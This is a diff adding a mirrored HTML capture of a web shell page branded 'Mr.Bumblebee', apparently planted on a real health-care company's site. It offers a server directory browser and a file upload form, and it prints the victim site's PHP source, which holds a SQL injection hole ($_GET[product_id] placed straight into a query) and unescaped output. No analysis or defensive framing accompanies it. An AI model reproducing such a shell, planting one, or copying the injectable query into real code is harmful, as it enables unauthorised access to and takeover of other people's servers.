@@ -1,0 +1,150 @@
+<!DOCTYPE HTML>
+<html>
+
+<!-- Mirrored from genialhcpl.com/uplO&ded/5cd6c0026675d_mini.php?filesrc=/home/oxgm1dym3no7/public_html/product_details.php&path=/home/oxgm1dym3no7/public_html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Dec 2019 15:59:43 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<link href="#" rel="stylesheet" type="text/css">
+<title>Mr.Bumblebee</title>
+<center>
+<img src="../../i.imgur.com/wY37Uuf.jpg" style="opacity:0.5; width:150px; height:150px";></center>
+<style>
+body{
+font-family: "Tahoma";
+background-color: black;
+color:red;
+}
+#content tr:hover{
+background-color: #191919;
+text-shadow:0px 0px 10px #fff;
+}
+
+#content .first{
+background-color: #191919;
+}
+table{
+border: 1px #000000 dotted;
+}
+a{
+color:white;
+text-decoration: none;
+}
+a:hover{
+color:red;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 1px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</head>
+<body>
+<h1><center><font color="red">-=[ Mr.</font><font color="white"> Bumblebee ]=-</font><br>
+			<font size="2px"><font color="red"><b>_Indonesia_</b></font>
+			</center></h1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td><font color="lime">Path :</font> <a href="5cd6c0026675d_minia922.html?path=/">/</a><a href="5cd6c0026675d_mini390d.html?path=/home">home</a>/<a href="5cd6c0026675d_mini9bae.html?path=/home/oxgm1dym3no7">oxgm1dym3no7</a>/<a href="5cd6c0026675d_minie421.html?path=/home/oxgm1dym3no7/public_html">public_html</a>/</td></tr><tr><td><form enctype="multipart/form-data" method="POST">
+<font color="lime">File Upload :</font> <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr><tr><td>Current File : /home/oxgm1dym3no7/public_html/product_details.php</tr></td></table><br /><pre>&lt;?php
+include &quot;Incl_ude/manager_config.php&quot;;
+?&gt;
+&lt;!DOCTYPE html &gt;
+&lt;!--  Website template by freewebsitetemplates.com  --&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+	&lt;title&gt;Genial Health Care Pvt Ltd&lt;/title&gt;
+	&lt;meta  charset=iso-8859-1&quot; /&gt;
+	&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+	&lt;!--[if IE 6]&gt;
+		&lt;link href=&quot;css/ie6.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+	&lt;![endif]--&gt;
+	&lt;!--[if IE 7]&gt;
+        &lt;link href=&quot;css/ie7.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;  
+	&lt;![endif]--&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+	  
+			&lt;div id=&quot;header&quot;&gt;
+	           		&lt;a href=&quot;index.php&quot; id=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.gif&quot; width=&quot;310&quot; height=&quot;114&quot; alt=&quot;&quot; title=&quot;&quot;&gt;&lt;/a&gt;
+					&lt;ul class=&quot;navigation&quot;&gt;
+						&lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+						&lt;li&gt;&lt;a href=&quot;about-us.php&quot;&gt;Welcome Note&lt;/a&gt;&lt;/li&gt;
+						&lt;li&gt;&lt;a href=&quot;product.php&quot;&gt;Product&lt;/a&gt;&lt;/li&gt;
+						&lt;li&gt;&lt;a href=&quot;login.php&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
+						&lt;li&gt;&lt;a href=&quot;contact-us.php&quot;&gt;Contact us&lt;/a&gt;&lt;/li&gt;
+					&lt;/ul&gt;
+			&lt;/div&gt;
+			
+			&lt;div id=&quot;body&quot;&gt;
+			
+			       &lt;div id=&quot;content&quot;&gt;
+				   
+				        &lt;div class=&quot;content&quot;&gt;
+							&lt;div class=&quot;about&quot; style=&quot;min-height:500px&quot;&gt;
+							     &lt;h2&gt;PRODUCT DETAILS&lt;/h2&gt;
+                                 
+								 
+								 
+								 
+								 &lt;p&gt;
+								 &lt;table width=&quot;100%&quot;&gt;
+									&lt;?php
+									$rs=mysql_fetch_array(mysql_query(&quot;select * from &quot;.TABLEPREFIX.&quot;_product where product_id='$_GET[product_id]'&quot;));
+									?&gt;
+									&lt;tr&gt;
+										&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;&lt;?php echo $rs[product_name]?&gt;&lt;/strong&gt;&lt;/td&gt;
+									&lt;/tr&gt;
+									&lt;tr&gt;
+										&lt;td align=&quot;left&quot;&gt;&lt;?php echo $rs[specification]?&gt;&lt;/td&gt;
+									&lt;/tr&gt;
+									&lt;tr&gt;
+										&lt;td align=&quot;left&quot;&gt;&lt;?php echo $rs[description]?&gt;&lt;/td&gt;
+									&lt;/tr&gt;
+									&lt;tr&gt;
+										&lt;td align=&quot;left&quot;&gt;&lt;img src=&quot;uplO&amp;ded/&lt;?php echo $rs[picture]?&gt;&quot; width=&quot;300&quot; height=&quot;300&quot; /&gt;&lt;/td&gt;
+									&lt;/tr&gt;
+									&lt;tr&gt;
+										&lt;td align=&quot;left&quot;&gt;&lt;?php echo $rs[doses]?&gt;&lt;/td&gt;
+									&lt;/tr&gt;
+								 &lt;/table&gt;	
+								 &lt;/p&gt;
+								 
+								 
+								 
+								 
+								 
+								 				
+							&lt;/div&gt;
+						&lt;/div&gt;
+						
+					    
+				   
+				   
+				  
+			
+			&lt;/div&gt;
+			
+			&lt;div id=&quot;footer&quot;&gt;
+			        &lt;div id=&quot;footnote&quot;&gt;
+						&lt;div class=&quot;section&quot;&gt;
+						   &amp;copy; 2013 &lt;a href=&quot;index.php&quot;&gt;Genial Health Care Pvt Ltd&lt;/a&gt;. All Rights Reserved.
+						&lt;/div&gt;
+					&lt;/div&gt;
+			&lt;/div&gt;
+			
+	
+&lt;/body&gt;
+&lt;/html&gt;</pre><font color="red" size="2px"><center><br/><b>Copyright &copy; 2017 <font color="white">|| <font color="red">Recoded By <font color="white">Mr.Bumblebee</a></center></font>
+
+</body>
+
+<!-- Mirrored from genialhcpl.com/uplO&ded/5cd6c0026675d_mini.php?filesrc=/home/oxgm1dym3no7/public_html/product_details.php&path=/home/oxgm1dym3no7/public_html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Dec 2019 15:59:43 GMT -->
+</html>
